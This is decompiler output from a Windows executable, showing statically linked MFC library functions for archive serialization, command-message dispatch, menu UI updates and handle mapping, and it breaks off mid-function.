CArchive * __thiscall CArchive::operator>>(CArchive *this,ushort *param_1)

{
  if (((byte)this[0x18] & 1) == 0) {
    AfxThrowArchiveException(4,*(wchar_t **)(this + 0x14));
  }
  if (*(uint *)(this + 0x2c) < *(int *)(this + 0x28) + 2U) {
    FillBuffer(this,(*(int *)(this + 0x28) - *(uint *)(this + 0x2c)) + 2);
  }
  *param_1 = **(ushort **)(this + 0x28);
  *(int *)(this + 0x28) = *(int *)(this + 0x28) + 2;
  return this;
}



// Library Function - Single Match
//  public: class CArchive & __thiscall CArchive::operator>>(unsigned long &)
// 
// Library: Visual Studio 2008 Release

CArchive * __thiscall CArchive::operator>>(CArchive *this,ulong *param_1)

{
  if (((byte)this[0x18] & 1) == 0) {
    AfxThrowArchiveException(4,*(wchar_t **)(this + 0x14));
  }
  if (*(uint *)(this + 0x2c) < *(int *)(this + 0x28) + 4U) {
    FillBuffer(this,(*(int *)(this + 0x28) - *(uint *)(this + 0x2c)) + 4);
  }
  *param_1 = **(ulong **)(this + 0x28);
  *(int *)(this + 0x28) = *(int *)(this + 0x28) + 4;
  return this;
}



// Library Function - Single Match
//  public: static struct CRuntimeClass * __stdcall CRuntimeClass::FromName(char const *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CRuntimeClass * CRuntimeClass::FromName(char *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  int iVar2;
  LPCSTR *ppCVar3;
  
  if (param_1 == (char *)0x0) {
    AfxThrowNotSupportedException();
  }
  pAVar1 = AfxGetModuleState();
  AfxLockGlobals(0);
  ppCVar3 = *(LPCSTR **)(pAVar1 + 0x1c);
  while( true ) {
    if (ppCVar3 == (LPCSTR *)0x0) {
      AfxUnlockGlobals(0);
      return (CRuntimeClass *)0x0;
    }
    iVar2 = lstrcmpA(param_1,*ppCVar3);
    if (iVar2 == 0) break;
    ppCVar3 = (LPCSTR *)ppCVar3[5];
  }
  AfxUnlockGlobals(0);
  return (CRuntimeClass *)ppCVar3;
}



// Library Function - Single Match
//  public: static struct CRuntimeClass * __stdcall CRuntimeClass::Load(class CArchive &,unsigned
// int *)
// 
// Library: Visual Studio 2008 Release

CRuntimeClass * CRuntimeClass::Load(CArchive *param_1,uint *param_2)

{
  uint uVar1;
  CRuntimeClass *pCVar2;
  uint uVar3;
  ushort local_4c [2];
  char local_48 [64];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  if (param_2 != (uint *)0x0) {
    CArchive::operator>>(param_1,local_4c);
    *param_2 = (uint)local_4c[0];
    CArchive::operator>>(param_1,local_4c);
    if (local_4c[0] < 0x40) {
      uVar3 = (uint)local_4c[0];
      uVar1 = CArchive::Read(param_1,local_48,uVar3);
      if (uVar1 == uVar3) {
        local_48[uVar3] = '\0';
        FromName(local_48);
      }
    }
  }
  pCVar2 = (CRuntimeClass *)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return pCVar2;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::Write(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::Write(CArchive *this,void *param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  
  if ((param_2 != 0) && (param_1 != (void *)0x0)) {
    if ((~*(uint *)(this + 0x18) & 1) == 0) {
      AfxThrowArchiveException(2,*(wchar_t **)(this + 0x14));
    }
    uVar1 = *(int *)(this + 0x2c) - (int)*(void **)(this + 0x28);
    uVar2 = param_2;
    if (uVar1 <= param_2) {
      uVar2 = uVar1;
    }
    FUN_0040be3a(*(void **)(this + 0x28),uVar1,param_1,uVar2);
    *(uint *)(this + 0x28) = *(int *)(this + 0x28) + uVar2;
    uVar1 = param_2 - uVar2;
    if (uVar1 != 0) {
      Flush(this);
      iVar3 = uVar1 - uVar1 % *(uint *)(this + 0x20);
      (**(code **)(**(int **)(this + 0x24) + 0x38))((int)param_1 + uVar2,iVar3);
      uVar1 = uVar1 - iVar3;
      if (*(int *)(this + 8) != 0) {
        (**(code **)(**(int **)(this + 0x24) + 0x50))
                  (1,*(undefined4 *)(this + 0x20),this + 0x30,this + 0x2c);
        *(undefined4 *)(this + 0x28) = *(undefined4 *)(this + 0x30);
      }
      if (uVar1 < *(uint *)(this + 0x20)) goto LAB_0040cfbc;
      do {
        AfxThrowNotSupportedException();
LAB_0040cfbc:
      } while (*(void **)(this + 0x28) != *(void **)(this + 0x30));
      FUN_0040be3a(*(void **)(this + 0x28),uVar1,(void *)((int)param_1 + uVar2 + iVar3),uVar1);
      *(uint *)(this + 0x28) = *(int *)(this + 0x28) + uVar1;
    }
  }
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::WriteCount(unsigned long)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::WriteCount(CArchive *this,ulong param_1)

{
  if (param_1 < 0xffff) {
    operator<<(this,(ushort)param_1);
  }
  else {
    operator<<(this,0xffff);
    operator<<(this,param_1);
  }
  return;
}



// Library Function - Single Match
//  public: unsigned long __thiscall CArchive::ReadCount(void)
// 
// Library: Visual Studio 2008 Release

ulong __thiscall CArchive::ReadCount(CArchive *this)

{
  CArchive *local_8;
  
  local_8 = this;
  operator>>(this,(ushort *)&local_8);
  if ((short)local_8 == -1) {
    operator>>(this,(ulong *)&local_8);
  }
  else {
    local_8 = (CArchive *)((uint)local_8 & 0xffff);
  }
  return (ulong)local_8;
}



// Library Function - Single Match
//  public: void __thiscall CRuntimeClass::Store(class CArchive &)const 
// 
// Library: Visual Studio 2008 Release

void __thiscall CRuntimeClass::Store(CRuntimeClass *this,CArchive *param_1)

{
  uint uVar1;
  CArchive *this_00;
  uint uVar2;
  
  uVar1 = lstrlenA(*(LPCSTR *)this);
  uVar2 = uVar1 & 0xffff;
  this_00 = CArchive::operator<<(param_1,*(ushort *)(this + 8));
  CArchive::operator<<(this_00,(ushort)uVar2);
  CArchive::Write(param_1,*(void **)this,uVar1 & 0xffff);
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::EnsureRead(void *,unsigned int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::EnsureRead(CArchive *this,void *param_1,uint param_2)

{
  uint uVar1;
  
  uVar1 = Read(this,param_1,param_2);
  if (uVar1 != param_2) {
    AfxThrowArchiveException(3,(wchar_t *)0x0);
  }
  return;
}



undefined ** FUN_0040d0a0(void)

{
  return &PTR_s_CArchiveException_004298b0;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: virtual int __thiscall CArchiveException::GetErrorMessage(char *,unsigned int,unsigned
// int *)const 
//  public: virtual int __thiscall CArchiveException::GetErrorMessage(wchar_t *,unsigned
// int,unsigned int *)const 
// 
// Library: Visual Studio 2008 Release

undefined4 __thiscall GetErrorMessage(void *this,wchar_t *param_1,uint param_2,int *param_3)

{
  int *piVar1;
  undefined4 uVar2;
  wchar_t *local_18 [4];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0xc;
  if (param_1 == (wchar_t *)0x0) {
    uVar2 = 0;
  }
  else {
    if (param_3 != (int *)0x0) {
      *param_3 = *(int *)((int)this + 8) + 0xf1b0;
    }
    local_8 = 0;
    FUN_0040b274(local_18);
    local_8._0_1_ = 1;
    CSimpleStringT<>(&param_3,(int *)((int)this + 0xc));
    local_8 = CONCAT31(local_8._1_3_,2);
    if (param_3[-3] == 0) {
      ATL::CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>::
      LoadStringW((CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_> *)
                  &param_3,0xf006);
    }
    piVar1 = param_3;
    AfxFormatString1((CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>
                      *)local_18,*(int *)((int)this + 8) + 0xf1b0);
    ATL::Checked::tcsncpy_s(param_1,param_2,local_18[0],0xffffffff);
    FUN_0040ae6f((int **)(piVar1 + -4));
    FUN_0040ae6f((int **)(local_18[0] + -8));
    uVar2 = 1;
  }
  return uVar2;
}



undefined4 Catch_0040d147(void)

{
  return 0x40d14d;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall CArchiveException::CArchiveException(int,char const *)
//  public: __thiscall CArchiveException::CArchiveException(int,wchar_t const *)
// 
// Library: Visual Studio 2008 Release

undefined4 * __thiscall CArchiveException(void *this,undefined4 param_1,wchar_t *param_2)

{
  FUN_0040a66b((int)this);
  *(undefined ***)this = CArchiveException::vftable;
  FUN_0040b274((void *)((int)this + 0xc));
  *(undefined4 *)((int)this + 8) = param_1;
  FID_conflict_operator_((void *)((int)this + 0xc),param_2);
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040d19b(void *this,byte param_1)

{
  *(undefined ***)this = CArchiveException::vftable;
  FUN_0040ae6f((int **)(*(int *)((int)this + 0xc) + -0x10));
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// Library Function - Multiple Matches With Same Base Name
//  void __stdcall AfxThrowArchiveException(int,char const *)
//  void __stdcall AfxThrowArchiveException(int,wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void AfxThrowArchiveException(undefined4 param_1,wchar_t *param_2)

{
  code *pcVar1;
  void *this;
  undefined4 *local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40d1d4;
  this = operator_new(0x10);
  local_14[0] = (undefined4 *)0x0;
  local_8 = 0;
  if (this != (void *)0x0) {
    local_14[0] = CArchiveException(this,param_1,param_2);
  }
  local_8 = 0xffffffff;
  __CxxThrowException_8(local_14,&DAT_0042fa2c);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  int __stdcall _AfxDispatchCmdMsg(class CCmdTarget *,unsigned int,int,void (__thiscall
// CCmdTarget::*)(void),void *,unsigned int,struct AFX_CMDHANDLERINFO *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int _AfxDispatchCmdMsg(CCmdTarget *param_1,uint param_2,int param_3,_func_void *param_4,
                      void *param_5,uint param_6,AFX_CMDHANDLERINFO *param_7)

{
  int iVar1;
  CCmdTarget *extraout_ECX;
  undefined4 unaff_EBX;
  undefined4 uVar2;
  void *unaff_ESI;
  void *pvVar3;
  
  uVar2 = unaff_EBX;
  pvVar3 = unaff_ESI;
  if (param_1 != (CCmdTarget *)0x0) goto LAB_0040d21c;
LAB_0040d217:
  AfxThrowNotSupportedException();
  param_1 = extraout_ECX;
  uVar2 = unaff_EBX;
  pvVar3 = unaff_ESI;
LAB_0040d21c:
  unaff_EBX = 1;
  if (param_7 != (AFX_CMDHANDLERINFO *)0x0) {
    *(CCmdTarget **)param_7 = param_1;
    *(_func_void **)(param_7 + 4) = param_4;
    return 1;
  }
  unaff_ESI = pvVar3;
  switch(param_6) {
  case 0x39:
    (*param_4)();
    return 1;
  case 0x3a:
    iVar1 = (*param_4)();
    return iVar1;
  case 0x3b:
    param_5 = (void *)param_2;
    break;
  case 0x3c:
    param_5 = (void *)param_2;
    goto LAB_0040d301;
  case 0x3d:
    if (param_5 != (void *)0x0) {
                    // WARNING: Load size is inaccurate
      (*param_4)(*(undefined4 *)((int)param_5 + 4),*param_5);
      return 1;
    }
    goto LAB_0040d217;
  case 0x3e:
    if (param_5 != (void *)0x0) {
                    // WARNING: Load size is inaccurate
      iVar1 = (*param_4)(*(undefined4 *)((int)param_5 + 4),*param_5);
      return iVar1;
    }
    goto LAB_0040d217;
  case 0x3f:
    if (param_5 != (void *)0x0) {
                    // WARNING: Load size is inaccurate
      (*param_4)(param_2,*(undefined4 *)((int)param_5 + 4),*param_5);
      return 1;
    }
    goto LAB_0040d217;
  case 0x40:
    if (param_5 != (void *)0x0) {
                    // WARNING: Load size is inaccurate
      iVar1 = (*param_4)(param_2,*(undefined4 *)((int)param_5 + 4),*param_5);
      return iVar1;
    }
    goto LAB_0040d217;
  case 0x41:
    unaff_ESI = param_5;
    if (param_5 != (void *)0x0) {
      (*param_4)(param_5);
      goto LAB_0040d2d4;
    }
    goto LAB_0040d217;
  case 0x42:
    goto switchD_0040d246_caseD_42;
  case 0x43:
    break;
  case 0x44:
LAB_0040d301:
    iVar1 = (*param_4)(param_5);
    return iVar1;
  default:
    return 0;
  }
  (*param_4)(param_5);
  return 1;
switchD_0040d246_caseD_42:
  unaff_ESI = param_5;
  if (param_5 != (void *)0x0) {
    (*param_4)(param_5,param_2,pvVar3,uVar2);
LAB_0040d2d4:
    iVar1 = *(int *)((int)param_5 + 0x1c);
    *(undefined4 *)((int)param_5 + 0x1c) = 0;
    return (uint)(iVar1 == 0);
  }
  goto LAB_0040d217;
}



// Library Function - Single Match
//  public: virtual int __thiscall CCmdTarget::OnCmdMsg(unsigned int,int,void *,struct
// AFX_CMDHANDLERINFO *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall
CCmdTarget::OnCmdMsg
          (CCmdTarget *this,uint param_1,int param_2,void *param_3,AFX_CMDHANDLERINFO *param_4)

{
  void *pvVar1;
  bool bVar2;
  AFX_MODULE_STATE *pAVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined3 extraout_var;
  uint uVar6;
  code **ppcVar7;
  AFX_MSGMAP_ENTRY *pAVar8;
  void **ppvVar9;
  uint uVar10;
  
  if (param_2 == -2) {
    pAVar3 = AfxGetModuleState();
    if (*(int *)(pAVar3 + 0x3c) != 0) goto LAB_0040d363;
  }
  else {
    if (param_2 != -3) {
      if (param_2 != -1) {
        uVar6 = param_2 & 0xffff;
        uVar10 = (uint)param_2 >> 0x10;
        param_2 = uVar6;
        if (uVar10 != 0) goto LAB_0040d41b;
      }
      uVar10 = 0x111;
LAB_0040d41b:
      ppcVar7 = (code **)(**(code **)(*(int *)this + 0x28))();
      while( true ) {
        if (*ppcVar7 == (code *)0x0) {
          return 0;
        }
        pAVar8 = AfxFindMessageEntry((AFX_MSGMAP_ENTRY *)ppcVar7[1],uVar10,param_2,param_1);
        if (pAVar8 != (AFX_MSGMAP_ENTRY *)0x0) break;
        ppcVar7 = (code **)(**ppcVar7)();
      }
      iVar4 = _AfxDispatchCmdMsg(this,param_1,param_2,*(_func_void **)(pAVar8 + 0x14),param_3,
                                 *(uint *)(pAVar8 + 0x10),param_4);
      return iVar4;
    }
    param_2 = 0;
    if (param_3 != (void *)0x0) {
      pvVar1 = *(void **)((int)param_3 + 0x30);
      puVar5 = (undefined4 *)(**(code **)(*(int *)this + 0x2c))();
      do {
        if (puVar5 == (undefined4 *)0x0) {
          return param_2;
        }
        if (param_2 != 0) {
          return param_2;
        }
        ppvVar9 = (void **)puVar5[1];
        while (((ppvVar9[1] != (void *)0x0 && (ppvVar9[2] != (void *)0x0)) && (param_2 == 0))) {
          if ((void *)param_1 == ppvVar9[1]) {
            if (pvVar1 == (void *)0x0) {
              if (*ppvVar9 == (void *)0x0) {
LAB_0040d3e0:
                *(void **)((int)param_3 + 4) = ppvVar9[2];
                param_2 = 1;
              }
            }
            else if ((*ppvVar9 != (void *)0x0) &&
                    (bVar2 = _IsEqualGUID(pvVar1,*ppvVar9), CONCAT31(extraout_var,bVar2) != 0))
            goto LAB_0040d3e0;
          }
          ppvVar9 = ppvVar9 + 3;
        }
        puVar5 = (undefined4 *)*puVar5;
      } while( true );
    }
  }
  AfxThrowNotSupportedException();
LAB_0040d363:
  pAVar3 = AfxGetModuleState();
  iVar4 = (**(code **)(**(int **)(pAVar3 + 0x3c) + 4))(this,param_1,param_3,param_4);
  return iVar4;
}



undefined4 FUN_0040d461(void)

{
  return 1;
}



undefined4 FUN_0040d467(void)

{
  return 0;
}



undefined4 FUN_0040d46a(void)

{
  return 0x80029c4a;
}



undefined * FUN_0040d478(void)

{
  return &DAT_00429914;
}



undefined * FUN_0040d47e(void)

{
  return &DAT_0042994c;
}



undefined4 FUN_0040d484(void)

{
  return 1;
}



undefined * FUN_0040d488(void)

{
  return &DAT_00429978;
}



undefined4 FUN_0040d48e(void)

{
  return 0;
}



undefined * FUN_0040d493(void)

{
  return &DAT_0042998c;
}



// Library Function - Single Match
//  public: __thiscall CCmdUI::CCmdUI(void)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

void __thiscall CCmdUI::CCmdUI(CCmdUI *this)

{
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 0x20) = 0;
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 0x24) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 0x1c) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  return;
}



// Library Function - Single Match
//  public: unsigned int __thiscall CMenu::CheckMenuItem(unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

uint __thiscall CMenu::CheckMenuItem(CMenu *this,uint param_1,uint param_2)

{
  DWORD DVar1;
  
  DVar1 = ::CheckMenuItem(*(HMENU *)(this + 4),param_1,param_2);
  return DVar1;
}



// Library Function - Single Match
//  public: unsigned int __thiscall CMenu::EnableMenuItem(unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

uint __thiscall CMenu::EnableMenuItem(CMenu *this,uint param_1,uint param_2)

{
  uint uVar1;
  
  uVar1 = ::EnableMenuItem(*(HMENU *)(this + 4),param_1,param_2);
  return uVar1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: int __thiscall CMenu::ModifyMenuA(unsigned int,unsigned int,unsigned int,char const *)
//  public: int __thiscall CMenu::ModifyMenuW(unsigned int,unsigned int,unsigned int,wchar_t const
// *)
// 
// Library: Visual Studio 2008 Release

BOOL FID_conflict_ModifyMenuW
               (HMENU hMnu,UINT uPosition,UINT uFlags,UINT_PTR uIDNewItem,LPCWSTR lpNewItem)

{
  BOOL BVar1;
  int in_ECX;
  
  BVar1 = ModifyMenuW(*(HMENU *)(in_ECX + 4),(UINT)hMnu,uPosition,uFlags,(LPCWSTR)uIDNewItem);
  return BVar1;
}



// Library Function - Single Match
//  public: __thiscall CCmdTarget::CCmdTarget(void)
// 
// Library: Visual Studio 2008 Release

CCmdTarget * __thiscall CCmdTarget::CCmdTarget(CCmdTarget *this)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  *(AFX_MODULE_STATE **)(this + 0x1c) = pAVar1;
  *(undefined4 *)(this + 4) = 1;
  *(undefined4 *)(this + 0x14) = 1;
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall CCmdTarget::~CCmdTarget(void)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __thiscall CCmdTarget::~CCmdTarget(CCmdTarget *this)

{
  if (*(int *)(this + 0x10) != 0) {
    (**(code **)(*(int *)(this + 0x10) + 0x1c))();
  }
  *(undefined4 *)(this + 0x1c) = 0;
  return;
}



void FUN_0040d54c(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  (**(code **)(**(int **)(pAVar1 + 4) + 0x9c))(1);
  return;
}



void FUN_0040d561(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  (**(code **)(**(int **)(pAVar1 + 4) + 0x9c))(0xffffffff);
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CCmdUI::Enable(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CCmdUI::Enable(CCmdUI *this,int param_1)

{
  int iVar1;
  uint in_EAX;
  HWND pHVar2;
  CWnd *pCVar3;
  CMenu *extraout_ECX;
  CMenu *this_00;
  
  this_00 = *(CMenu **)(this + 0xc);
  if (this_00 == (CMenu *)0x0) {
    if (*(int *)(this + 0x14) != 0) {
      if (param_1 == 0) {
        iVar1 = *(int *)(this + 0x14);
        pHVar2 = GetFocus();
        if (pHVar2 == *(HWND *)(iVar1 + 0x20)) {
          pHVar2 = GetParent(*(HWND *)(iVar1 + 0x20));
          pCVar3 = CWnd::FromHandle(pHVar2);
          SendMessageW(*(HWND *)(pCVar3 + 0x20),0x28,0,0);
        }
      }
      CWnd::EnableWindow(*(CWnd **)(this + 0x14),param_1);
      goto LAB_0040d5f7;
    }
LAB_0040d595:
    AfxThrowNotSupportedException();
    this_00 = extraout_ECX;
  }
  else {
    if (*(int *)(this + 0x10) != 0) {
      return;
    }
    in_EAX = *(uint *)(this + 8);
    if (*(uint *)(this + 0x20) <= in_EAX) goto LAB_0040d595;
  }
  CMenu::EnableMenuItem(this_00,in_EAX,(-(uint)(param_1 != 0) & 0xfffffffd) + 3 | 0x400);
LAB_0040d5f7:
  *(undefined4 *)(this + 0x18) = 1;
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CCmdUI::SetCheck(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CCmdUI::SetCheck(CCmdUI *this,int param_1)

{
  uint uVar1;
  CMenu *extraout_ECX;
  CMenu *this_00;
  
  this_00 = *(CMenu **)(this + 0xc);
  if (this_00 == (CMenu *)0x0) {
    uVar1 = *(uint *)(this + 0x14);
    if (uVar1 != 0) {
      uVar1 = SendMessageW(*(HWND *)(uVar1 + 0x20),0x87,0,0);
      if ((uVar1 & 0x2000) == 0) {
        return;
      }
      SendMessageW(*(HWND *)(*(int *)(this + 0x14) + 0x20),0xf1,param_1,0);
      return;
    }
  }
  else {
    if (*(int *)(this + 0x10) != 0) {
      return;
    }
    uVar1 = *(uint *)(this + 8);
    if (uVar1 < *(uint *)(this + 0x20)) goto LAB_0040d626;
  }
  AfxThrowNotSupportedException();
  this_00 = extraout_ECX;
LAB_0040d626:
  CMenu::CheckMenuItem(this_00,uVar1,-(uint)(param_1 != 0) & 8 | 0x400);
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CCmdUI::SetText(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CCmdUI::SetText(CCmdUI *this,wchar_t *param_1)

{
  UINT UVar1;
  LPCWSTR unaff_EDI;
  LPCWSTR lpNewItem;
  
  if (param_1 != (wchar_t *)0x0) goto LAB_0040d68d;
  do {
    while( true ) {
      AfxThrowNotSupportedException();
LAB_0040d68d:
      if (*(int *)(this + 0xc) != 0) break;
      this = *(CCmdUI **)(this + 0x14);
      if (this != (CCmdUI *)0x0) {
        AfxSetWindowText(*(HWND__ **)(this + 0x20),param_1);
        return;
      }
    }
    if (*(int *)(this + 0x10) != 0) {
      return;
    }
    lpNewItem = unaff_EDI;
    UVar1 = GetMenuState(*(HMENU *)(*(int *)(this + 0xc) + 4),*(UINT *)(this + 8),0x400);
    unaff_EDI = (LPCWSTR)0x400;
  } while (*(HMENU *)(this + 0x20) <= *(HMENU *)(this + 8));
  FID_conflict_ModifyMenuW
            (*(HMENU *)(this + 8),UVar1 & 0xfffff6fb | 0x400,*(UINT *)(this + 4),(UINT_PTR)param_1,
             lpNewItem);
  return;
}



// Library Function - Single Match
//  void __stdcall _AfxLoadDotBitmap(void)
// 
// Library: Visual Studio 2008 Release

void _AfxLoadDotBitmap(void)

{
  byte bVar1;
  LONG LVar2;
  undefined *puVar3;
  int extraout_ECX;
  byte *pbVar4;
  ushort uVar5;
  int iVar6;
  int iVar7;
  int local_94;
  int local_90;
  int local_8c;
  undefined local_88 [128];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  LVar2 = GetMenuCheckMarkDimensions();
  local_90 = (int)(short)LVar2;
  local_8c = (int)(short)((uint)LVar2 >> 0x10);
  if ((local_90 < 5) || (iVar7 = local_90, local_8c < 6)) {
    AfxThrowNotSupportedException();
    iVar7 = extraout_ECX;
  }
  if (0x20 < iVar7) {
    iVar7 = 0x20;
    local_90 = 0x20;
  }
  iVar6 = iVar7 + 0xf >> 4;
  iVar7 = ((iVar7 + -4) / 2 + iVar6 * 0x10) - iVar7;
  if (0xc < iVar7) {
    iVar7 = 0xc;
  }
  if (0x20 < local_8c) {
    local_8c = 0x20;
  }
  _memset(local_88,0xff,0x80);
  puVar3 = local_88 + (local_8c + -6 >> 1) * iVar6 * 2;
  pbVar4 = &DAT_00429994;
  local_94 = 5;
  do {
    bVar1 = *pbVar4;
    pbVar4 = pbVar4 + 1;
    uVar5 = ~((ushort)bVar1 << ((byte)iVar7 & 0x1f));
    *puVar3 = (char)(uVar5 >> 8);
    puVar3[1] = (char)uVar5;
    puVar3 = puVar3 + iVar6 * 2;
    local_94 = local_94 + -1;
  } while (local_94 != 0);
  DAT_00434360 = CreateBitmap(local_90,local_8c,1,1,local_88);
  if (DAT_00434360 == (HBITMAP)0x0) {
    DAT_00434360 = LoadBitmapW((HINSTANCE)0x0,(LPCWSTR)0x7fe3);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CCmdUI::SetRadio(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CCmdUI::SetRadio(CCmdUI *this,int param_1)

{
  (**(code **)(*(int *)this + 4))(param_1 != 0);
  if ((*(int *)(this + 0xc) != 0) && (*(int *)(this + 0x10) == 0)) {
    if (*(uint *)(this + 0x20) <= *(uint *)(this + 8)) {
      AfxThrowNotSupportedException();
    }
    if ((DAT_00434360 == (HBITMAP)0x0) && (_AfxLoadDotBitmap(), DAT_00434360 == (HBITMAP)0x0)) {
      return;
    }
    SetMenuItemBitmaps(*(HMENU *)(*(int *)(this + 0xc) + 4),*(UINT *)(this + 8),0x400,(HBITMAP)0x0,
                       DAT_00434360);
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: __thiscall CHandleMap::CHandleMap(struct CRuntimeClass *,void (__stdcall*)(class CObject
// *),void (__stdcall*)(class CObject *),unsigned int,int)
// 
// Library: Visual Studio 2008 Release

CHandleMap * __thiscall
CHandleMap::CHandleMap
          (CHandleMap *this,CRuntimeClass *param_1,_func_void_CObject_ptr *param_2,
          _func_void_CObject_ptr *param_3,uint param_4,int param_5)

{
  _func_void_CObject_ptr *p_Var1;
  
  *(undefined ***)this = vftable;
  CFixedAllocNoSync::CFixedAllocNoSync((CFixedAllocNoSync *)(this + 4),*(uint *)(param_1 + 4),0x40);
  CMapPtrToPtr::CMapPtrToPtr((CMapPtrToPtr *)(this + 0x1c),10);
  CMapPtrToPtr::CMapPtrToPtr((CMapPtrToPtr *)(this + 0x38),4);
  p_Var1 = (_func_void_CObject_ptr *)0x0;
  if (param_2 != (_func_void_CObject_ptr *)0x0) goto LAB_0040d8c6;
  do {
    AfxThrowNotSupportedException();
LAB_0040d8c6:
  } while (param_3 == p_Var1);
  CMapPtrToPtr::InitHashTable((CMapPtrToPtr *)(this + 0x38),7,(int)p_Var1);
  *(_func_void_CObject_ptr **)(this + 0x14) = param_2;
  *(_func_void_CObject_ptr **)(this + 0x18) = param_3;
  *(uint *)(this + 0x58) = param_4;
  *(int *)(this + 0x5c) = param_5;
  *(CRuntimeClass **)(this + 0x54) = param_1;
  return this;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: class CObject * __thiscall CHandleMap::FromHandle(void *)
// 
// Library: Visual Studio 2008 Release

CObject * __thiscall CHandleMap::FromHandle(CHandleMap *this,void *param_1)

{
  int iVar1;
  CObject *pCVar2;
  _func_int_uint *p_Var3;
  CObject **ppCVar4;
  
  if (param_1 == (void *)0x0) {
    pCVar2 = (CObject *)0x0;
  }
  else {
    pCVar2 = (CObject *)CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(this + 0x1c),param_1);
    if (pCVar2 == (CObject *)0x0) {
      pCVar2 = (CObject *)CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(this + 0x38),param_1);
      if (pCVar2 == (CObject *)0x0) {
        p_Var3 = AfxSetNewHandler(AfxCriticalNewHandler);
        pCVar2 = (CObject *)CFixedAllocNoSync::Alloc((CFixedAllocNoSync *)(this + 4));
        if (pCVar2 == (CObject *)0x0) {
          FUN_0040a59b();
        }
        (**(code **)(this + 0x14))(pCVar2);
        ppCVar4 = (CObject **)CMapPtrToPtr::operator[]((CMapPtrToPtr *)(this + 0x38),param_1);
        *ppCVar4 = pCVar2;
        AfxSetNewHandler(p_Var3);
        iVar1 = *(int *)(this + 0x58);
        *(void **)(pCVar2 + iVar1) = param_1;
        if (*(int *)(this + 0x5c) == 2) {
          *(void **)((int)(pCVar2 + iVar1) + 4) = param_1;
        }
      }
      else {
        iVar1 = *(int *)(this + 0x58);
        *(void **)(pCVar2 + iVar1) = param_1;
        if (*(int *)(this + 0x5c) == 2) {
          *(void **)((int)(pCVar2 + iVar1) + 4) = param_1;
        }
      }
    }
  }
  return pCVar2;
}



void Catch_0040d99b(void)

{
  code *pcVar1;
  int unaff_EBP;
  
  AfxSetNewHandler(*(_func_int_uint **)(unaff_EBP + 8));
  __CxxThrowException_8(0,(byte *)0x0);
